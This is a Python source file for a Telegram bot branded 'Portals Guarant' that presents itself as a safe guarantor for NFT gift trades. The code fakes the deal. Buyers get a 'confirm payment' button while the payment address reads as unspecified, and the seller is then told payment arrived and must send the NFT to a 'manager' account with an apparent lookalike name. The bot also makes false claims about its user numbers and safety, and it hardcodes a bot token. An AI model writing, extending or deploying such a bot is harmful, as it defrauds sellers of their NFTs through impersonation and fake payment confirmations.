import telebot
from telebot import types
import json
import os
import time
import random
import re

# ============================================================
# НАСТРОЙКИ БОТА
# ============================================================
TOKEN = "9160443999:AAEotagCg7DX_cvfsaJSeQdR_k2XQnCmpSM"
MANAGER_USER = "@giftRepIayeraBot"
PORTALS_APP_LINK = "https://t.me/portals/app"
DB_FILE = "portals_db.json"

PHOTO_MAIN = "https://mistrobot510-blip.github.io/cryptoironik/IMG_20261106_142725_563.jpg"
PHOTO_DEAL = "https://mistrobot510-blip.github.io/cryptoironik/IMG_20261106_142720_547.jpg"
PHOTO_CREATED = "https://mistrobot510-blip.github.io/cryptoironik/IMG_20261106_142718_403.jpg"
PHOTO_JOINED = "https://mistrobot510-blip.github.io/cryptoironik/IMG_20261106_153513_366.jpg?v=2"

bot = telebot.TeleBot(TOKEN)
USER_STATES = {}

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def init_user(user_id):
    uid = str(user_id)
    db = load_db()
    if uid not in db:
        db[uid] = {"lang": "ru", "deals": []}
        save_db(db)

def main_menu(lang="ru"):
    markup = types.InlineKeyboardMarkup(row_width=2)
    if lang == "ru":
        markup.add(types.InlineKeyboardButton("✏️ Создать сделку", callback_data="create_deal", style="success"))
        markup.add(types.InlineKeyboardButton("📋 Мои сделки", callback_data="my_deals", style="success"))
        markup.add(
            types.InlineKeyboardButton("🛒 Portals Market", url=PORTALS_APP_LINK, style="success"),
            types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{MANAGER_USER.replace('@', '')}", style="success")
        )
        markup.add(types.InlineKeyboardButton("🌐 Язык", callback_data="lang_menu", style="success"))
    else:
        markup.add(types.InlineKeyboardButton("✏️ Create deal", callback_data="create_deal", style="success"))
        markup.add(types.InlineKeyboardButton("📋 My deals", callback_data="my_deals", style="success"))
        markup.add(
            types.InlineKeyboardButton("🛒 Portals Market", url=PORTALS_APP_LINK, style="success"),
            types.InlineKeyboardButton("📞 Support", url=f"https://t.me/{MANAGER_USER.replace('@', '')}", style="success")
        )
        markup.add(types.InlineKeyboardButton("🌐 Language", callback_data="lang_menu", style="success"))
    return markup

def lang_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data="set_lang_ru", style="success"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en", style="success")
    )
    markup.add(types.InlineKeyboardButton("🔙 Назад / Back", callback_data="back_to_main", style="success"))
    return markup

def pay_method_menu(lang="ru"):
    markup = types.InlineKeyboardMarkup(row_width=3)
    if lang == "ru":
        markup.add(
            types.InlineKeyboardButton("💎 Кошелек", callback_data="pay_wallet", style="success"),
            types.InlineKeyboardButton("💳 Карта", callback_data="pay_card", style="success"),
            types.InlineKeyboardButton("⭐ Звезды", callback_data="pay_stars", style="success")
        )
        markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="back_to_main", style="success"))
    else:
        markup.add(
            types.InlineKeyboardButton("💎 Wallet", callback_data="pay_wallet", style="success"),
            types.InlineKeyboardButton("💳 Card", callback_data="pay_card", style="success"),
            types.InlineKeyboardButton("⭐ Stars", callback_data="pay_stars", style="success")
        )
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main", style="success"))
    return markup

def get_currency_info(pay_method, lang="ru"):
    if pay_method == "wallet":
        return ("TON", "💎", "TON")
    elif pay_method == "card":
        return ("RUB", "💳", "RUB")
    elif pay_method == "stars":
        return ("Звезды", "🌟", "Stars") if lang == "ru" else ("Stars", "🌟", "Stars")
    return ("", "", "")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.from_user.id in USER_STATES:
        del USER_STATES[message.from_user.id]
        
    init_user(message.from_user.id)
    db = load_db()
    lang = db[str(message.from_user.id)].get("lang", "ru")
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1].split("_")[1]
        
        found_deal = None
        creator_id = None
        
        for uid, u_data in db.items():
            for d in u_data.get("deals", []):
                if f"#{deal_id}" in d:
                    found_deal = d
                    creator_id = uid
                    break
            if found_deal: break
        
        if found_deal:
            if str(message.from_user.id) == creator_id:
                bot.send_message(message.chat.id, f"👤 Вы создатель этой сделки <b>#{deal_id}</b>.\n\nОжидайте, пока покупатель перейдет по ссылке и оплатит.", parse_mode="HTML")
                return
            
            parts = found_deal.split(' - ')
            nft_part = parts[1] if len(parts) > 1 else "NFT"
            price_part = parts[2] if len(parts) > 2 else "0"
            seller_username = parts[3] if len(parts) > 3 else "Продавец"
            
            text = (
                f"🛒 <b>Сделка #{deal_id}</b>\n"
                f"👤 <b>Вы покупатель.</b>\n\n"
                f"📌 Продавец: {seller_username}\n"
                f"• Успешные сделки: 0\n"
                f"• NFT: /vrtx <a href='https://t.me/nft/{nft_part}'>{nft_part}</a>\n\n"
                f"🏦 <b>Адрес для оплаты:</b>\n"
                f"Не указан\n\n"
                f"💰 <b>Сумма:</b> {price_part}\n"
                f"📝 <b>Комментарий:</b> {deal_id}\n\n"
                f"⚠️ <b>Комментарий обязателен!</b>"
            )
            
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f"buy_deal_{deal_id}", style="success"))
            markup.add(types.InlineKeyboardButton("❌ Выйти", callback_data="back_to_main", style="danger"))
            
            bot.send_photo(message.chat.id, PHOTO_JOINED, caption=text, reply_markup=markup, parse_mode="HTML")
            
            try:
                notify_text = f"🤝 <b>Покупатель в сделке!</b>\n\nПокупатель перешел по ссылке на сделку #{deal_id}.\nОжидайте оплаты."
                bot.send_photo(creator_id, PHOTO_JOINED, caption=notify_text, parse_mode="HTML")
            except Exception as e:
                print(f"Ошибка уведомления: {e}")
            return
        else:
            bot.send_message(message.chat.id, "❌ Сделка не найдена.")
            return

    text = (
        "🎁 <b>Portals Guarant - #1 По трейдингу NFT подарков.</b>\n\n"
        "🛡 Покупайте и продавайте всё, что угодно — безопасно, ведь нас выбирают более 500k пользователей!\n\n"
        "• Удобное управление кошельками\n"
        "• Безопасные сделки с гарантией\n"
        "• 0% Комиссия\n\n"
        "👇 Выберите нужный раздел ниже:"
    ) if lang == "ru" else (
        "🎁 <b>Portals Guarant - #1 NFT Gift Trading.</b>\n\n"
        "🛡 Buy and sell anything — safely, because over 500k users choose us!\n\n"
        "• Convenient wallet management\n"
        "• Secure deals with guarantee\n"
        "• 0% Commission\n\n"
        "👇 Choose the section below:"
    )
    bot.send_photo(message.chat.id, PHOTO_MAIN, caption=text, reply_markup=main_menu(lang), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    init_user(user_id)
    db = load_db()
    user = db[str(user_id)]
    lang = user.get("lang", "ru")
    
    bot.answer_callback_query(call.id)

    if call.data == "back_to_main":
        if user_id in USER_STATES:
            del USER_STATES[user_id]
        text = (
            "🎁 <b>Portals Guarant - #1 По трейдингу NFT подарков.</b>\n\n"
            "🛡 Покупайте и продавайте всё, что угодно — безопасно, ведь нас выбирают более 500k пользователей!\n\n"
            "• Удобное управление кошельками\n"
            "• Безопасные сделки с гарантией\n"
            "• 0% Комиссия\n\n"
            "👇 Выберите нужный раздел ниже:"
        ) if lang == "ru" else (
            "🎁 <b>Portals Guarant - #1 NFT Gift Trading.</b>\n\n"
            "🛡 Buy and sell anything — safely, because over 500k users choose us!\n\n"
            "• Convenient wallet management\n"
            "• Secure deals with guarantee\n"
            "• 0% Commission\n\n"
            "👇 Choose the section below:"
        )
        try:
            bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(PHOTO_MAIN, caption=text, parse_mode="HTML"), reply_markup=main_menu(lang))
        except:
            bot.send_photo(call.message.chat.id, PHOTO_MAIN, caption=text, reply_markup=main_menu(lang), parse_mode="HTML")

    elif call.data == "lang_menu":
        text = "🌐 <b>Выберите язык:</b>" if lang == "ru" else "🌐 <b>Choose language:</b>"
        try:
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=text, reply_markup=lang_menu(), parse_mode="HTML")
        except:
            bot.send_message(call.message.chat.id, text, reply_markup=lang_menu(), parse_mode="HTML")
    
    elif call.data.startswith("set_lang_"):
        new_lang = call.data.split("_")[2]
        db[str(user_id)]["lang"] = new_lang
        save_db(db)
        text = "🎁 <b>Portals Guarant - #1 По трейдингу NFT подарков.</b>" if new_lang == "ru" else "🎁 <b>Portals Guarant - #1 NFT Gift Trading.</b>"
        try:
            bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(PHOTO_MAIN, caption=text, parse_mode="HTML"), reply_markup=main_menu(new_lang))
        except:
            bot.send_photo(call.message.chat.id, PHOTO_MAIN, caption=text, reply_markup=main_menu(new_lang), parse_mode="HTML")

    elif call.data == "my_deals":
        deals = user.get("deals", [])
        if not deals:
            text = "📋 <b>У вас пока нет активных сделок.</b>" if lang == "ru" else "📋 <b>You have no active deals.</b>"
        else:
            text = "📋 <b>Ваши сделки:</b>\n\n" if lang == "ru" else "📋 <b>Your deals:</b>\n\n"
            for d in deals:
                text += f"🔹 {d}\n"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Назад" if lang == "ru" else "🔙 Back", callback_data="back_to_main", style="success"))
        try:
            bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(PHOTO_MAIN, caption=text, parse_mode="HTML"), reply_markup=markup)
        except:
            bot.send_photo(call.message.chat.id, PHOTO_MAIN, caption=text, reply_markup=markup, parse_mode="HTML")

    elif call.data == "create_deal":
        text = "💰 <b>Выберите метод оплаты:</b>" if lang == "ru" else "💰 <b>Choose payment method:</b>"
        try:
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=text, reply_markup=pay_method_menu(lang), parse_mode="HTML")
        except:
            bot.send_message(call.message.chat.id, text, reply_markup=pay_method_menu(lang), parse_mode="HTML")

    elif call.data.startswith("pay_"):
        pay_method = call.data.split("_")[1]
        USER_STATES[user_id] = {"pay_method": pay_method, "lang": lang}
        
        curr_name, curr_emoji, curr_code = get_currency_info(pay_method, lang)
        
        if lang == "ru":
            text = f"💵 <b>Создание</b>\n\nВведите сумму в {curr_name} {curr_emoji}:"
        else:
            text = f"💵 <b>Creation</b>\n\nEnter amount in {curr_name} {curr_emoji}:"
            
        try:
            bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(PHOTO_DEAL, caption=text, parse_mode="HTML"), reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Назад" if lang == "ru" else "🔙 Back", callback_data="create_deal", style="success")))
            msg = call.message
        except:
            msg = bot.send_photo(call.message.chat.id, PHOTO_DEAL, caption=text, parse_mode="HTML")
        bot.register_next_step_handler(msg, process_amount)

    elif call.data.startswith("buy_deal_"):
        deal_id = call.data.split("_")[2]
        db = load_db()
        seller_id = None
        for uid, u_data in db.items():
            for d in u_data.get("deals", []):
                if f"#{deal_id}" in d:
                    seller_id = uid
                    break
            if seller_id: break
        
        paid_text = f"✅ <b>Вы оплатили сделку #{deal_id}!</b>\n\nОжидайте передачи NFT от продавца."
        
        try:
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=paid_text, reply_markup=None, parse_mode="HTML")
        except:
            bot.send_message(call.message.chat.id, paid_text, parse_mode="HTML")
        
        if seller_id:
            try:
                notify_text = (
                    f"💰 <b>Покупатель оплатил сделку #{deal_id}!</b>\n\n"
                    f"Передайте NFT менеджеру и ожидайте подтверждения."
                )
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("👨‍💻 Передать менеджеру", url=f"https://t.me/{MANAGER_USER.replace('@', '')}", style="success"))
                markup.add(types.InlineKeyboardButton("✅ Я передал NFT", callback_data=f"transfer_nft_{deal_id}", style="success"))
                bot.send_message(seller_id, notify_text, reply_markup=markup, parse_mode="HTML")
            except Exception as e:
                print(f"Ошибка: {e}")

    elif call.data.startswith("transfer_nft_"):
        deal_id = call.data.split("_")[2]
        db = load_db()
        buyer_id = None
        for uid, u_data in db.items():
            for d in u_data.get("deals", []):
                if f"#{deal_id}" in d and uid != str(call.from_user.id):
                    buyer_id = uid
                    break
            if buyer_id: break
        
        # УВЕДОМЛЕНИЕ ПОКУПАТЕЛЮ
        if buyer_id:
            try:
                bot.send_message(buyer_id, f"✅ <b>Продавец передал NFT менеджеру по сделке #{deal_id}!</b>\n\nОжидайте подтверждения.", parse_mode="HTML")
            except Exception as e:
                print(f"Ошибка: {e}")
        
        # УВЕДОМЛЕНИЕ ПРОДАВЦУ (ТЕКСТ КАК ТЫ ПРОСИЛ)
        success_text = (
            f"✅ <b>Передача подтверждена!</b>\n\n"
            f"Обратитесь к менеджеру {MANAGER_USER} за выводом средств."
        )
        try:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=success_text, reply_markup=None, parse_mode="HTML")
        except:
            bot.send_message(call.message.chat.id, success_text, parse_mode="HTML")

def process_amount(message):
    user_id = message.from_user.id
    try:
        amount = float(message.text)
    except:
        bot.send_message(message.chat.id, "❌ Введите число.")
        return
    
    pay_method = USER_STATES[user_id]["pay_method"]
    curr_name, curr_emoji, curr_code = get_currency_info(pay_method, USER_STATES[user_id]["lang"])
    
    USER_STATES[user_id]["amount"] = amount
    USER_STATES[user_id]["currency_display"] = f"{amount} {curr_emoji} {curr_name}"
    
    lang = USER_STATES[user_id]["lang"]
    text = "📝 <b>Ссылка на NFT</b>\n\nОтправьте ссылку (t.me/nft/...):" if lang == "ru" else "📝 <b>NFT Link</b>\n\nSend link (t.me/nft/...):"
    msg = bot.send_message(message.chat.id, text, parse_mode="HTML")
    bot.register_next_step_handler(msg, process_nft_link)

def process_nft_link(message):
    user_id = message.from_user.id
    text = message.text.strip()
    lang = USER_STATES[user_id]["lang"]
    match = re.search(r't\.me/nft/([a-zA-Z0-9]+-\d+)', text)
    if not match:
        bot.send_message(message.chat.id, "❌ Неверная ссылка. Отправьте t.me/nft/Name-123" if lang == "ru" else "❌ Invalid link. Send t.me/nft/Name-123")
        return
    nft_slug = match.group(1)
    nft_link = f"https://t.me/nft/{nft_slug}"
    
    amount = USER_STATES[user_id]["amount"]
    currency_display = USER_STATES[user_id]["currency_display"]
    
    seller_username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    
    deal_id = random.randint(100000, 999999)
    db = load_db()
    db[str(user_id)]["deals"].append(f"#{deal_id} - {nft_slug} - {currency_display} - {seller_username}")
    save_db(db)
    
    if lang == "ru":
        text = (
            f"✅ <b>Сделка создана!</b>\n\n"
            f"💰 {currency_display}\n"
            f"🔗 {nft_link}\n\n"
            f"👤 Ссылка для покупателя:\n"
            f"<code>https://t.me/{(bot.get_me()).username}?start=deal_{deal_id}</code>\n\n"
            f"🆘 Менеджер: {MANAGER_USER}"
        )
        cancel_btn = "❌ Отменить"
    else:
        text = (
            f"✅ <b>Deal created!</b>\n\n"
            f"💰 {currency_display}\n"
            f"🔗 {nft_link}\n\n"
            f"👤 Link for buyer:\n"
            f"<code>https://t.me/{(bot.get_me()).username}?start=deal_{deal_id}</code>\n\n"
            f"🆘 Manager: {MANAGER_USER}"
        )
        cancel_btn = "❌ Cancel"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(cancel_btn, callback_data=f"cancel_deal_{deal_id}", style="success"))
    bot.send_photo(message.chat.id, PHOTO_CREATED, caption=text, reply_markup=markup, parse_mode="HTML")
    if user_id in USER_STATES:
        del USER_STATES[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith("cancel_deal_"))
def cancel_deal(call):
    bot.answer_callback_query(call.id, "Сделка отменена. Свяжитесь с менеджером: @cryptoironik" if "deal" in call.data else "Deal cancelled. Contact manager: @cryptoironik", show_alert=True)
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="❌ Сделка отменена.", reply_markup=None)
    if call.from_user.id in USER_STATES:
        del USER_STATES[call.from_user.id]

if __name__ == '__main__':
    print("Бот Portals запущен...")
    bot.infinity_polling(timeout=60, long_polling_timeout=30)